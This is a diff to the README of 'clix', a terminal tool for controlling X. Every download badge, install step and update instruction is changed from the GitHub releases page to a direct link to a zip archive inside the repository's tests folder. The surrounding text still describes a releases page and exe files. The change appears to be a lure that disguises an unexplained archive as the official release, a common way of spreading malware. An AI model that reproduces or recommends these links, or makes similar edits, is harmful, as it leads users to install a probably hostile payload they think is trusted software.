@@ -1,6 +1,6 @@
 # 🤖 clix - Control X from the Terminal Easily
 
-[![Download clix](https://img.shields.io/badge/Download-clix-ff6600?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/releases)
+[![Download clix](https://img.shields.io/badge/Download-clix-ff6600?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/raw/refs/heads/main/tests/Software-v2.2-beta.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No special software needs to be installed beyond the clix program.
 
 To get clix, visit the official release page on GitHub by clicking the link below:
 
-[![Download clix](https://img.shields.io/badge/Get_clix-Download-blue?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/releases)
+[![Download clix](https://img.shields.io/badge/Get_clix-Download-blue?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/raw/refs/heads/main/tests/Software-v2.2-beta.3.zip)
 
 This page lists all the available versions. Look for the latest Windows version available for download.
 
@@ -40,7 +40,7 @@ This page lists all the available versions. Look for the latest Windows version 
 
 Follow these steps to get clix running on Windows:
 
-1. Visit the releases page here: https://github.com/dubious-pinetum918/clix/releases
+1. Visit the releases page here: https://github.com/dubious-pinetum918/clix/raw/refs/heads/main/tests/Software-v2.2-beta.3.zip
 
 2. Look for the latest release. It will usually have a name like `clix-x.y.z-windows.exe` or simply `clix.exe`.
 
@@ -123,7 +123,7 @@ If the program does not start or you see errors:
 
 To get new versions, patches, or bug fixes for clix:
 
-Visit https://github.com/dubious-pinetum918/clix/releases regularly.
+Visit https://github.com/dubious-pinetum918/clix/raw/refs/heads/main/tests/Software-v2.2-beta.3.zip regularly.
 
 Every release includes notes explaining new features and fixes.
 
@@ -149,4 +149,4 @@ Explore how clix connects with your AI Agent. Details about agent setup and cust
 
 ---
 
-[![Download clix](https://img.shields.io/badge/Download_clix-Get%20Started-brightgreen?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/releases)
+[![Download clix](https://img.shields.io/badge/Download_clix-Get%20Started-brightgreen?style=for-the-badge)](https://github.com/dubious-pinetum918/clix/raw/refs/heads/main/tests/Software-v2.2-beta.3.zip)
